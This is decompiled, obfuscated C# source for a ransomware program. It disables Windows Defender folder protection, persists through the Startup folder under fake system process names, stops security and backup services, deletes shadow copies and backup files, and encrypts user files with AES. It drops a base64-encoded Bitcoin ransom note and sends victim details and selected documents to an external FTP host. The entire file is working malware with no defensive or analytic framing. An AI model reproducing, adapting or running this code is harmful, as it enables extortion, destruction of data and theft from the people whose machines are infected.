using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using ns1;
using ns3;
using ns4;

namespace ns0;

internal class Class0
{
	public class Class1
	{
		internal static StringCollection stringCollection_0 = new StringCollection();

		internal static List<string> list_0 = new List<string>();
	}

	private sealed class Class2
	{
		public string[] string_0;

		public string[] string_1;

		public string string_2;

		public string string_3;
	}

	private sealed class Class3
	{
		public Class2 class2_0;

		public string string_0;

		public void method_0()
		{
			smethod_1(string_0, class2_0.string_0, class2_0.string_3, class2_0.string_1, class2_0.string_2);
		}
	}

	public static string string_0 = "EVET";

	public static byte[] byte_0 = null;

	public static string string_1 = "NO";

	public static string string_2 = "100000000";

	public static List<string> list_0 = new List<string>();

	public static List<string> list_1 = new List<string>();

	public static string string_3 = "NO";

	public static string string_4 = "";

	public static string string_5 = "NO";

	public static int int_0 = 0;

	public static string string_6 = "NO";

	public static string string_7 = "NO";

	public static string string_8 = "NO";

	public static string string_9 = "0";

	public static string string_10 = "NO";

	public static string string_11 = "NO";

	public static string string_12 = "NO";

	public static string string_13 = "YES";

	public static List<string> list_2 = new List<string>
	{
		"lsass.exe", "svchst.exe", "crcss.exe", "chrome32.exe", "firefox.exe", "calc.exe", "mysqld.exe", "dllhst.exe", "opera32.exe", "memop.exe",
		"spoolcv.exe", "ctfmom.exe", "SkypeApp.exe"
	};

	public static List<string> list_3 = new List<string>();

	public static string string_14 = "YES";

	public static string string_15 = "NO";

	public static string string_16 = "NO";

	public static List<string> list_4 = new List<string>();

	public static string string_17 = "NO";

	private static string string_18 = "c1a76b5a-12ab-45c5-b9d9-d692faa6e7a2";

	public static string string_19 = "NO";

	public static string string_20 = "YES";

	public static List<string> list_5 = new List<string> { "stop avpsus /y", "stop McAfeeDLPAgentService /y", "stop mfewc /y", "stop BMR Boot Service /y", "stop NetBackup BMR MTFTP Service /y" };

	public static List<string> list_6 = new List<string> { "config SQLTELEMETRY start= disabled", "config SQLTELEMETRY$ECWDB2 start= disabled", "config SQLWriter start= disabled", "config SstpSvc start= disabled" };

	public static List<string> list_7 = new List<string> { "/IM mspub.exe /F", "/IM mydesktopqos.exe /F", "/IM mydesktopservice.exe /F" };

	public static List<string> list_8 = new List<string>
	{
		"Delete Shadows /all /quiet", "resize shadowstorage /for=c: /on=c: /maxsize=401MB", "resize shadowstorage /for=c: /on=c: /maxsize=unbounded", "resize shadowstorage /for=d: /on=d: /maxsize=401MB", "resize shadowstorage /for=d: /on=d: /maxsize=unbounded", "resize shadowstorage /for=e: /on=e: /maxsize=401MB", "resize shadowstorage /for=e: /on=e: /maxsize=unbounded", "resize shadowstorage /for=f: /on=f: /maxsize=401MB", "resize shadowstorage /for=f: /on=f: /maxsize=unbounded", "resize shadowstorage /for=g: /on=g: /maxsize=401MB",
		"resize shadowstorage /for=g: /on=g: /maxsize=unbounded", "resize shadowstorage /for=h: /on=h: /maxsize=401MB", "resize shadowstorage /for=h: /on=h: /maxsize=unbounded", "Delete Shadows /all /quiet"
	};

	public static List<string> list_9 = new List<string> { "/s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk", "/s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk", "/s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk", "/s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk", "/s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk", "/s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk" };

	public static string string_21 = "NO";

	internal static DateTime dateTime_0 = new DateTime(2000, 1, 1);

	public static string string_22 = "YES";

	public static string string_23 = "10";

	public static string string_24 = "NO";

	public static string string_25 = "NO";

	public static string string_26 = "NO";

	public static string string_27 = "NO";

	public static string string_28 = "NO";

	public static string string_29 = "NO";

	public static List<string> list_10 = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string string_30 = "NO";

	public static string string_31 = "1";

	public static string string_32 = "NO";

	public static string string_33 = "NO";

	public static string string_34 = "NO";

	private static void Main(string[] args)
	{
		try
		{
			Class32.smethod_34(string_18);
		}
		catch (Exception)
		{
		}
		if (string_8 == "YES")
		{
			Thread.Sleep(int.Parse(string_9));
		}
		if (string_27 == "YES" && string_28 == "YES")
		{
			try
			{
				Class32.smethod_12("Set-MpPreference -EnableControlledFolderAccess Disabled");
			}
			catch
			{
			}
		}
		if (string_12 == "YES" && !Class32.smethod_27())
		{
			Class32.smethod_54();
		}
		if (string_15 == "YES" && Class32.smethod_27())
		{
			Class32.smethod_71(new Class12(), bool_0: false);
			Class32.smethod_50(new Class12());
		}
		if (string_7 == "YES")
		{
			Class32.smethod_72();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (string_5 == "YES" && fileName != text2)
		{
			Thread thread = new Thread((ThreadStart)Class32.smethod_63);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Highest;
			thread.Start();
		}
		if (string_3 == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				int_0 = Class32.smethod_24(0, list_2.Count);
				File.Copy(fileName, text + list_2[int_0], overwrite: true);
				Process.Start(text + list_2[int_0]);
				Class32.smethod_43();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		if (string_21 == "YES" && DateTime.Now < dateTime_0)
		{
			return;
		}
		foreach (string item in list_5)
		{
			Class32.smethod_59("net.exe", item);
		}
		foreach (string item2 in list_6)
		{
			Class32.smethod_59("sc.exe", item2);
		}
		foreach (string item3 in list_7)
		{
			Class32.smethod_59("taskkill.exe", item3);
		}
		foreach (string item4 in list_8)
		{
			Class32.smethod_59("vssadmin.exe", item4);
		}
		foreach (string item5 in list_9)
		{
			Class32.smethod_59("del.exe", item5);
		}
		Class32.smethod_16();
		if (string_14 == "YES")
		{
			Class11.smethod_0();
		}
		if (string_20 == "YES")
		{
			Class10.smethod_0();
		}
		if (string_6 == "YES")
		{
			Class32.smethod_23();
		}
		if (string_24 == "NO")
		{
			string_4 = Class32.smethod_41(32);
		}
		else
		{
			string_4 = "QZFIYRNIPI21U2THJM6T6WTSR9N6J12Q";
		}
		string text3 = Class32.smethod_18(string_4);
		smethod_0(new string[1] { "[auto]" }, new string[97]
		{
			"txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar", "zip",
			"html", "htm", "xlsx", "avi", "mp4", "ppt", "doc", "docx", "xlsx", "sxi",
			"sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost", "pst",
			"edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java", "cpp",
			"pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes", "vsd",
			"odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6", "sqlite3",
			"sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
			"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
			"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
			"mdb", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim"
		}, new string[0], string_4, ".crypted");
		string_4 = Class32.smethod_41(32);
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			streamWriter.WriteLine(Class32.smethod_44("QXRlbnRpb24hIGFsbCB5b3VyIGltcG9ydGFudCBmaWxlcyB3ZXJlIGVuY3J5cHRlZCENCnRvIGdldCB5b3VyIGZpbGVzIGJhY2sgc2VuZCAzIEJpdGNvaW5zIGFuZCBjb250YWN0IHVzIHdpdGggcHJvb2Ygb2YgcGF5bWVudCBhbmQgeW91ciBVbmlxdWUgSWRlbnRpZmllciBLZXkuDQpXZSB3aWxsIHNlbmQgeW91IGEgZGVjcnlwdGlvbiB0b29sIHdpdGggeW91ciBwZXJzb25hbCBkZWNyeXB0aW9uIHBhc3N3b3JkLg0KDQpXaGVyZSBjYW4geW91IGJ1eSBCaXRjb2luczoNCg0KaHR0cHM6Ly93d3cuY29pbmJhc2UuY29tDQpodHRwczovL2xvY2FsYml0Y29pbnMuY29tDQoNCkNPTlRBQ1QNCg0Kc2Vydm85OUBwcm90b25tYWlsLmNvbQ0KDQphbm90aGVyIGlmIHdlIG5vdCBhc253ZXINCg0Kc2Vydm8zM0Bwcm90b25tYWlsLmNvbQ0KDQpCaXRjb2luIHdhbGxldCB0byBtYWtlIHRoZSB0cmFuc2ZlciB0byBpczoxTVlOcHFhOUNLbmp2Y3Z4ZDI1aUI3cXh4ZVpiZldzQnpQ"));
			streamWriter.WriteLine(Class32.smethod_44("VW5pcXVlIElkZW50aWZpZXIgS2V5IChtdXN0IGJlIHNlbnQgdG8gdXMgdG9nZXRoZXIgd2l0aCBwcm9vZiBvZiBwYXltZW50KTog"));
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			streamWriter.WriteLine(text3);
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			if (string_19 == "NO")
			{
				streamWriter.WriteLine(Class32.smethod_44("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(list_4.Count));
			}
		}
		foreach (string item6 in list_3)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", item6 + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (string_17 == "YES")
		{
			try
			{
				if (string_19 == "NO")
				{
					Class32.smethod_66("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", "Client IP:  " + new WebClient().DownloadString("http://icanhazip.com") + "Date of encryption: " + default(DateTime).Date.ToString() + "\r\nNumber of files encrypted: " + Convert.ToString(list_4.Count) + "\r\nPossible affected files: \r\n" + Convert.ToString(list_4) + "\r\nClient Unique Identifier Key: " + text3);
				}
				else
				{
					Class32.smethod_66("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", "Client IP:  " + new WebClient().DownloadString("http://icanhazip.com") + "Date of encryption: " + default(DateTime).Date.ToString() + "\r\nPossible affected files: \r\n" + Convert.ToString(list_4) + "\r\nClient Unique Identifier Key: " + text3);
				}
			}
			catch
			{
			}
		}
		if (string_13 == "YES")
		{
			try
			{
				Class32.smethod_28(new Uri("http://koda2sa.6te.net/help.bmp"));
			}
			catch
			{
			}
		}
		Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (string_0 == "EVET")
		{
			Class32.smethod_43();
		}
	}

	private unsafe static void smethod_0(string[] string_35, string[] string_36, string[] string_37, string string_38, string string_39)
	{
		void* ptr = stackalloc byte[8];
		Class2 @class = new Class2();
		@class.string_0 = string_36;
		@class.string_1 = string_37;
		@class.string_2 = string_38;
		@class.string_3 = string_39;
		byte_0 = Encoding.ASCII.GetBytes(@class.string_2);
		if (string_35[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				*(int*)ptr = 0;
				while (*(int*)ptr < drives.Length)
				{
					if (drives[*(int*)ptr].IsReady)
					{
						list_0.Add(drives[*(int*)ptr].Name);
					}
					(*(int*)ptr)++;
				}
			}
		}
		else
		{
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < string_35.Length)
			{
				list_0.Add(string_35[*(int*)((byte*)ptr + 4)]);
				(*(int*)((byte*)ptr + 4))++;
			}
		}
		using List<string>.Enumerator enumerator = list_0.GetEnumerator();
		while (enumerator.MoveNext())
		{
			Class3 class2 = new Class3();
			class2.class2_0 = @class;
			class2.string_0 = enumerator.Current;
			if (string_19 == "YES")
			{
				Thread thread = new Thread(class2.method_0);
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				smethod_1(class2.string_0, @class.string_0, @class.string_3, @class.string_1, @class.string_2);
			}
		}
	}

	public unsafe static void smethod_1(string string_35, string[] string_36, string string_37, string[] string_38, string string_39)
	{
		void* ptr = stackalloc byte[8];
		if (!Directory.Exists(string_35))
		{
			return;
		}
		List<string> list = new List<string>();
		list = ((!(string_33 == "YES")) ? Class32.smethod_57(string_35) : Class32.smethod_67(string_35));
		*(int*)ptr = 0;
		while (*(int*)ptr < string_36.Length)
		{
			string value = string_36[*(int*)ptr];
			foreach (string item in list)
			{
				if (string_38.Length != 0)
				{
					*(int*)((byte*)ptr + 4) = 0;
					while (*(int*)((byte*)ptr + 4) < string_38.Length)
					{
						string value2 = string_38[*(int*)((byte*)ptr + 4)];
						if (!item.EndsWith(value2))
						{
							(*(int*)((byte*)ptr + 4))++;
							continue;
						}
						goto IL_02dd;
					}
				}
				if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || list_4.Contains(item))
				{
					continue;
				}
				list_4.Add(item);
				if (!list_3.Contains(Path.GetDirectoryName(item)))
				{
					list_3.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (string_22 == "YES" && fileStream.Length > Convert.ToInt32(string_23) * 1024 * 1024)
					{
						if (string_29 == "YES")
						{
							foreach (string item2 in list_10)
							{
								if (item.EndsWith(item2) && string_30 == "YES" && Convert.ToInt32(string_31) * 1024 * 1024 > fileStream.Length)
								{
									try
									{
										string text = "ftp://files.000webhost.com/public_html/";
										string text2 = "FTP UserName";
										string text3 = "ACCESS";
										Class32.smethod_46(text2, text, item, text3);
									}
									catch
									{
									}
								}
							}
						}
						byte[] array = Class32.smethod_6(item, Convert.ToInt32(string_23) * 1024 * 1024);
						byte[] array2 = Class32.smethod_64(array, Encoding.ASCII.GetBytes(string_39), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						Class32.smethod_17(array2, item);
						if (string_37 != ".*")
						{
							File.Move(item, item + string_37);
						}
					}
					else if (string_37 != ".*")
					{
						smethod_2(item, item + string_37, byte_0);
					}
					else
					{
						smethod_2(item, item + ".part", byte_0);
					}
				}
				catch (Exception)
				{
				}
				IL_02dd:;
			}
			(*(int*)ptr)++;
		}
	}

	private static void smethod_2(string string_35, string string_36, byte[] byte_1)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_36, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_35, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (string_36.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_35, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (string_29 == "YES")
					{
						foreach (string item in list_10)
						{
							if (string_35.EndsWith(item) && string_30 == "YES" && Convert.ToInt32(string_31) * 1024 * 1024 > fileStream3.Length)
							{
								try
								{
									string text = "ftp://files.000webhost.com/public_html/";
									string text2 = "FTP UserName";
									string text3 = "ACCESS";
									Class32.smethod_46(text2, text, string_35, text3);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_35) && num2 >= 0)
							{
								File.Delete(string_35);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_36.EndsWith(".part"))
					{
						File.Move(string_36, string_36.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_36);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
